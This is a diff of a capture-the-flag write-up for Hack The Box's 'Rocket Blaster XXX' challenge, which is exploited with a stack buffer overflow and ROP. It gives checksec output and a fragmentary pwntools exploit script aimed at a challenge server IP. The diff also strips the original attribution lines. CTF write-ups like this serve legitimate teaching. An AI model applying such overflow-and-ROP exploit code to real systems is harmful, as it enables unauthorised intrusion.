@@ -1,23 +1,16 @@
 # :game_die: HTB: Cyber Apocalypse 2024 - Rocket Blaster XXX
 
-> **Original Source:** [HTB: Cyber Apocalypse 2024 - Rocket Blaster XXX](https://infosecwriteups.com/htb-cyber-apocalypse-2024-rocket-blaster-xxx-b4611ea09e56)
-> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2024
-
 ---
 
 # HTB: Cyber Apocalypse 2024 — Rocket Blaster XXX
 
-
 Difficulty: Easy
 
-
 ### Description
-
 
 Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray — let the fight commence!
 
 ### Protection (checksec)
-
 
 ```
 $ checksec
@@ -32,39 +25,29 @@ IBT: Enabled
 Stripped: No
 ```
 
-
 ### Disassembly (ghidra)
-
 
 *32 bytes buffer (102 bytes is read)*
 
-
 We can notice in the read method, we read 0x66 (102) bytes of data, but the buffer is 32 bytes long.
-
 
 ## Get Szigecsán Dávid’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 *win function with specific parameters*
-
 
 Additionally, we find the fill_ammo function, which validates three parameters before reading and printing the flag.
 
 ### Exploitation
-
 
 - Overflows the buffer (32 bytes + 8 bytes for saved RBP)
 
 - Uses Return-Oriented Programming (ROP) to call fill_ammo with the correct arguments
 
 ### Solution (pwntools)
-
 
 ```
 #!/usr/bin/env python3
@@ -79,20 +62,17 @@ context(terminal=['tmux', 'split-window', '-h'])
 host = args.HOST or '83.136.254.189'
 port = int(args.PORT or 49069)
 
-
 def start_local(argv=[], *a, kw):
 if args.GDB:
 return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, kw)
 else:
 return process([exe.path] + argv, *a, kw)
 
-
 def start_remote(argv=[], *a, kw):
 io = connect(host, port)
 if args.GDB:
 gdb.attach(io, gdbscript=gdbscript)
 return io
-
 
 def start(argv=[], *a, kw):
 if args.REMOTE:
@@ -131,9 +111,7 @@ warning('Flag: ' + io.recv().decode('utf-8'))
 io.interactive()
 ```
 
-
 ### Skills Learned
-
 
 - buffer overflow
 
@@ -142,6 +120,3 @@ io.interactive()
 - ROP (Return-Oriented Programming)
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-cyber-apocalypse-2024-rocket-blaster-xxx-b4611ea09e56). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
